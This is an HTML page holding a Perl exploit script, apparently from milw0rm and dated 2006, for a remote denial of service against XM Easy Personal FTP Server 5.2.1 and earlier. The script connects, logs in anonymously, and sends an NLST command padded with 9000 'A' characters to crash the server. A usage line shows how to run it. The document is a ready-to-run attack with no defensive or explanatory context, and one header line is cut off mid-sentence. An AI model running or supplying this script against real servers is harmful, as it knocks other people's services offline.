<html><head><title>XM Easy Personal FTP Server <= 5.2.1 Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
#
# *
# * Title: XM Easy Personal FTP Server &lt;= 5.2.1 'NLST -al' Remote Denial of Service
# * Author: boecke
# * Discovery: boecke
# * Vulnerability Type: Remote Denial of Service
# * Risk: Low Risk (Requires valid
# * Software Affected: XM Easy Personal FTP Server &lt;= 5.2.1
# * Greetings: henrik, str0ke!
# *
#

use IO::Socket;

$commandToSend = &quot;NLST -al &quot;;
$remoteUsername = &quot;anonymous&quot;;
$remotePassword = &quot;borat\@kik.com&quot;;
$remotePort = $ARGV[1];

sub bannerExploit()
{
       print &quot;\n x XM Easy Personal FTP Server &lt;= v5.2.1 Remote Denial of Service\n&quot;;
       print &quot; x Author: boecke\n x Discovery: boecke (boecke [at] herzeleid [dot] net)\n\n&quot;;
}

if ( @ARGV &lt; 2 )
{
       bannerExploit();

       print &quot; * Usage: perl ftp.pl 192.168.0.1 21\n\n&quot;;

       exit;
}

if ($socket = IO::Socket::INET-&gt;new( PeerAddr =&gt; $ARGV[0], PeerPort =&gt; $remotePort, Proto =&gt; &quot;TCP&quot; ))
{
       bannerExploit();

       print &quot; + Establishing connection at &quot; . $ARGV[0] . &quot;:&quot; . $remotePort . &quot;\n&quot;;

       print $socket &quot;USER &quot; . $remoteUsername . &quot;\r\n&quot;;

       print &quot; * FTP Username: \'&quot; . $remoteUsername . &quot;\'\n&quot;;

       sleep( 1 );

       print $socket &quot;PASS &quot; . $remotePassword . &quot;\r\n&quot;;

       print &quot; * FTP Password: \'&quot; . $remotePassword . &quot;\'\n&quot;;

       print $socket $commandToSend . &quot;A&quot; x 9000 . &quot;\r\n&quot;;

       sleep( 3 );

       print $socket &quot;QUIT\r\n&quot;;

       print &quot; + Sent 9000 bytes of data to $ARGV[0]:$remotePort\n\n&quot;;
}
else
{
       bannerExploit();

       print &quot; + Failed to establish connection to &quot; . $ARGV[0] . &quot;:&quot; . $remotePort . &quot;\n&quot;;

}

# milw0rm.com [2006-11-04]</pre></html>